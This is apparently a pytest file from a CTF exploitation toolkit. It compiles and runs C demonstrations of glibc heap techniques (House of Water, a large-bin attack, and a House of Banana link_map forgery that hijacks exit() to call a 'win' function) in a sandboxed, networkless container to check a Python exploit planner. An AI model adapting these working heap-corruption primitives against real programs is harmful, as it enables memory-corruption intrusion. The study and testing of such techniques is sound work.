"""Allocator-transition oracles for the pwndepth heap plans.

The C fixtures are reduced, trusted forms of the published how2heap House-of-Water and
post-2.30 large-bin demonstrations.  They are compiled and executed only in the networkless pwn
container; their runtime addresses are then fed to the address-parameterized Python planners.
"""
from __future__ import annotations

import shutil
import subprocess
import textwrap
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parents[1]
IMAGE = "csctf-pwn:1"


WATER_C = r"""
#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL);
    void *relative = malloc(0x88); (void)malloc(0x18);
    void *start = malloc(0x88); (void)malloc(0x18);
    void *end = malloc(0x88); (void)malloc(0x18);
    uintptr_t metadata = (uintptr_t)relative & ~(uintptr_t)0xfff;
    void *fill[7];
    for (int i = 0; i < 7; ++i) fill[i] = malloc(0x88);
    for (int i = 0; i < 7; ++i) free(fill[i]);

    *(size_t *)((char *)start - 0x18) = 0x331;
    free((char *)start - 0x10);
    *(size_t *)((char *)start - 0x08) = 0x91;
    *(size_t *)((char *)end - 0x18) = 0x321;
    free((char *)end - 0x10);
    *(size_t *)((char *)end - 0x08) = 0x91;

    free(end); free(relative); free(start);
    volatile void *sort = malloc(0x700); (void)sort;
    *(uintptr_t *)start = metadata + 0x200;
    *(uintptr_t *)((char *)end + 0x08) = metadata + 0x200;
    for (int i = 0; i < 7; ++i) fill[i] = malloc(0x88);
    fill[0] = malloc(0x88); fill[1] = malloc(0x88);
    void *result = malloc(0x88);
    assert((uintptr_t)result == metadata + 0x210);
    printf("WATER %lx %lx %lx %lx %lx\n", (unsigned long)metadata,
           (unsigned long)relative, (unsigned long)start, (unsigned long)end,
           (unsigned long)result);
    return 0;
}
"""


LARGE_C = r"""
#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL);
    size_t target = 0;
    size_t *p1 = malloc(0x428); (void)malloc(0x18);
    size_t *p2 = malloc(0x418); (void)malloc(0x18);
    free(p1);
    volatile void *sort1 = malloc(0x438); (void)sort1;
    uintptr_t p1_header = (uintptr_t)(p1 - 2);
    uintptr_t bin_head = p1[0];
    assert(p1[0] == p1[1]);
    assert(p1[2] == p1_header && p1[3] == p1_header);
    free(p2);
    p1[3] = (size_t)((&target) - 4);
    volatile void *sort2 = malloc(0x438); (void)sort2;
    uintptr_t p2_header = (uintptr_t)(p2 - 2);
    assert(target == p2_header);
    printf("LARGE %lx %lx %lx %lx %lx\n", (unsigned long)p1_header,
           (unsigned long)p2_header, (unsigned long)&target,
           (unsigned long)target, (unsigned long)bin_head);
    return 0;
}
"""


BITS_C = r"""
#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

struct flags_235 {
    unsigned int l_type:2;
    unsigned int l_relocated:1;
    unsigned int l_init_called:1;
};
struct flags_236 {
    unsigned int l_type:2;
    unsigned int l_dt_relr_ref:1;
    unsigned int l_relocated:1;
    unsigned int l_init_called:1;
};
int main(void) {
    struct flags_235 old = {0};
    struct flags_236 modern = {0};
    uint32_t old_word = 0, modern_word = 0;
    old.l_init_called = 1;
    modern.l_init_called = 1;
    memcpy(&old_word, &old, sizeof(old));
    memcpy(&modern_word, &modern, sizeof(modern));
    assert(old_word == 0x08 && modern_word == 0x10);
    printf("MASKS %x %x\n", old_word, modern_word);
    return 0;
}
"""


BANANA_C = r"""
#define _GNU_SOURCE
#include <assert.h>
#include <dlfcn.h>
#include <elf.h>
#include <link.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static unsigned char *fake_map;
static Elf64_Dyn fini_dyn;
static Elf64_Dyn fini_size_dyn;
static void *fini_array[1];

static void win(void) { _exit(42); }
static void put64(size_t offset, uintptr_t value) { memcpy(fake_map + offset, &value, 8); }
static void put32(size_t offset, uint32_t value) { memcpy(fake_map + offset, &value, 4); }

int main(void) {
    void *handle = dlopen(NULL, RTLD_NOW);
    struct link_map *head = NULL;
    assert(handle != NULL);
    assert(dlinfo(handle, RTLD_DI_LINKMAP, &head) == 0);
    assert(head != NULL && head->l_next != NULL && head->l_next->l_next != NULL);
    struct link_map *replaced = head->l_next;
    struct link_map *successor = replaced->l_next;
    unsigned int chain_count = 0;
    for (struct link_map *item = head; item != NULL; item = item->l_next) ++chain_count;

    size_t *p1 = malloc(0x4d8);
    volatile void *guard1 = malloc(0x18);
    size_t *p2 = malloc(0x4c8);
    volatile void *guard2 = malloc(0x18);
    (void)guard1; (void)guard2;
    assert(p1 != NULL && p2 != NULL);
    fake_map = (unsigned char *)(p2 - 2);
    free(p1);
    volatile void *sort1 = malloc(0x4e8); (void)sort1;
    uintptr_t bin_head = p1[0];

    dprintf(STDOUT_FILENO, "BANANA %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %u\n",
            (unsigned long)(uintptr_t)&head->l_next,
            (unsigned long)(uintptr_t)replaced,
            (unsigned long)(uintptr_t)successor,
            (unsigned long)(uintptr_t)fake_map,
            (unsigned long)(uintptr_t)(p1 - 2),
            (unsigned long)bin_head,
            (unsigned long)(uintptr_t)&fini_dyn,
            (unsigned long)(uintptr_t)&fini_size_dyn,
            (unsigned long)(uintptr_t)fini_array,
            (unsigned long)(uintptr_t)&win,
            chain_count);

    free(p2);
    p1[3] = (size_t)((size_t *)&head->l_next - 4);
    volatile void *sort2 = malloc(0x4e8); (void)sort2;
    assert(head->l_next == (struct link_map *)fake_map);

    /* No allocator call follows: repurpose the inserted victim header as the exact fake map. */
    memset(fake_map, 0, 0x4b8);
    fini_dyn.d_tag = DT_FINI_ARRAY;
    fini_dyn.d_un.d_ptr = (Elf64_Addr)fini_array;
    fini_size_dyn.d_tag = DT_FINI_ARRAYSZ;
    fini_size_dyn.d_un.d_val = sizeof(fini_array);
    fini_array[0] = (void *)&win;
    put64(0x00, 0);
    put64(0x18, (uintptr_t)successor);
    put64(0x28, (uintptr_t)fake_map);
    put64(0x30, 0);
    put64(0x40 + DT_FINI_ARRAY * 8, (uintptr_t)&fini_dyn);
    put64(0x40 + DT_FINI_ARRAYSZ * 8, (uintptr_t)&fini_size_dyn);
    put32(0x354, 0x10);
    exit(0);
}
"""


ORACLE = r"""
import ctypes
import subprocess
import sys

libc = ctypes.CDLL(None)
libc.gnu_get_libc_version.restype = ctypes.c_char_p
version = libc.gnu_get_libc_version().decode().split(".")
version = ".".join(version[:2])
minor = int(version.split(".")[1])
assert 35 <= minor <= 41, version
assert version == "2.39", "the live Banana offsets below are profiled for csctf-pwn glibc 2.39"

flags = ["gcc", "-O0", "-fno-stack-protector"]
subprocess.run(flags + ["-o", "water", "water.c"], check=True)
subprocess.run(flags + ["-o", "large", "large.c"], check=True)
subprocess.run(flags + ["-o", "bits", "bits.c"], check=True)
subprocess.run(flags + ["-fno-pie", "-no-pie", "-o", "banana", "banana.c", "-ldl"], check=True)
water_line = subprocess.check_output(["./water"], text=True).strip().split()
large_line = subprocess.check_output(["./large"], text=True).strip().split()
masks = subprocess.check_output(["./bits"], text=True).strip().split()
banana_process = subprocess.run(["./banana"], capture_output=True, text=True, check=False)
assert banana_process.returncode == 42, banana_process.stdout + banana_process.stderr
banana_line = banana_process.stdout.strip().split()
assert water_line[0] == "WATER" and large_line[0] == "LARGE"
assert masks == ["MASKS", "8", "10"]
assert banana_line[0] == "BANANA"
metadata, relative, start, end, result = (int(item, 16) for item in water_line[1:])
p1, p2, target_address, target_value, bin_head = (
    int(item, 16) for item in large_line[1:]
)

sys.path.insert(0, "/repo/solvers/toolkits")
import pwndepth_heap_plans as heap

water = heap.build_house_of_water_plan(
    glibc_version=version,
    tcache_chunk_header_addr=metadata,
    relative_chunk_addr=relative,
    small_start_addr=start,
    small_end_addr=end,
    primitive="arbitrary_free",
    tcache_capacity=7,
    guards_present=True,
    can_forge_chunk_sizes=True,
    can_restore_chunk_sizes=True,
    can_corrupt_link_lsb=True,
    can_free_interior_headers=True,
    allow_bruteforce=False,
)
assert water.computed_dict()["fake_user_return"] == result

large = heap.build_large_bin_plan(
    glibc_version=version,
    existing_chunk_addr=p1,
    existing_chunk_size=0x430,
    victim_chunk_addr=p2,
    victim_chunk_size=0x420,
    target_addr=target_address,
    bin_head_addr=bin_head,
    sort_request=0x438,
    guards_present=True,
    target_writable=True,
    arena_managed=True,
)
assert large.computed_dict()["written_value"] == target_value == p2

(
    link_slot, replaced, successor, fake_map, banana_existing, banana_bin_head,
    fini_dyn, fini_size_dyn, fini_array, call_target,
) = (int(item, 16) for item in banana_line[1:11])
namespace_nloaded = int(banana_line[11])
banana_large = heap.build_large_bin_plan(
    glibc_version=version,
    existing_chunk_addr=banana_existing,
    existing_chunk_size=0x4E0,
    victim_chunk_addr=fake_map,
    victim_chunk_size=0x4D0,
    target_addr=link_slot,
    bin_head_addr=banana_bin_head,
    sort_request=0x4E8,
    guards_present=True,
    target_writable=True,
    arena_managed=True,
)
layout = heap.BananaLayout(
    size=0x4B8,
    l_addr=0x00,
    l_real=0x28,
    l_next=0x18,
    l_ns=0x30,
    l_init_called=0x354,
    l_init_called_mask=0x10,
    l_info=0x40,
    l_info_slots=84,
    l_init_called_width=4,
)
banana = heap.build_house_of_banana_plan(
    glibc_version=version,
    large_bin_plan=banana_large,
    layout=layout,
    fake_link_map_addr=fake_map,
    loader_link_slot_addr=link_slot,
    replaced_map_addr=replaced,
    replaced_map_next_addr=successor,
    fini_dyn_addr=fini_dyn,
    fini_array_size_dyn_addr=fini_size_dyn,
    fini_array_addr=fini_array,
    call_target=call_target,
    namespace_nloaded=namespace_nloaded,
    real_maps_before_fake=1,
    real_maps_after_fake=namespace_nloaded - 2,
    l_addr=0,
    namespace_id=0,
    cleanup_trigger="exit",
    replaces_real_map=True,
    zeroed_backing=True,
    sort_dependencies_safe=True,
    audit_modules_present=False,
)
assert banana.computed_dict()["large_bin_written_value"] == fake_map
print("PWNDEPTH_HEAP_DOCKER_ORACLE_OK", version)
"""


def _docker_ready() -> bool:
    if shutil.which("docker") is None:
        return False
    return subprocess.run(
        ["docker", "image", "inspect", IMAGE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    ).returncode == 0


def test_published_heap_transitions_in_pwn_container(tmp_path: Path) -> None:
    if not _docker_ready():
        pytest.skip(f"local {IMAGE} image is unavailable")
    (tmp_path / "water.c").write_text(textwrap.dedent(WATER_C), encoding="utf-8")
    (tmp_path / "large.c").write_text(textwrap.dedent(LARGE_C), encoding="utf-8")
    (tmp_path / "bits.c").write_text(textwrap.dedent(BITS_C), encoding="utf-8")
    (tmp_path / "banana.c").write_text(textwrap.dedent(BANANA_C), encoding="utf-8")
    (tmp_path / "oracle.py").write_text(textwrap.dedent(ORACLE), encoding="utf-8")
    command = [
        "docker", "run", "--rm", "--platform", "linux/amd64",
        "--network", "none", "--read-only", "--cap-drop", "ALL",
        "--security-opt", "no-new-privileges", "--pids-limit", "128",
        "--memory", "512m", "--tmpfs", "/tmp:rw,noexec,nosuid,size=32m",
        "-v", f"{ROOT}:/repo:ro", "-v", f"{tmp_path}:/work:rw",
        "-w", "/work", IMAGE, "python3", "oracle.py",
    ]
    result = subprocess.run(command, capture_output=True, text=True, timeout=60, check=False)
    assert result.returncode == 0, result.stdout + result.stderr
    assert "PWNDEPTH_HEAP_DOCKER_ORACLE_OK" in result.stdout
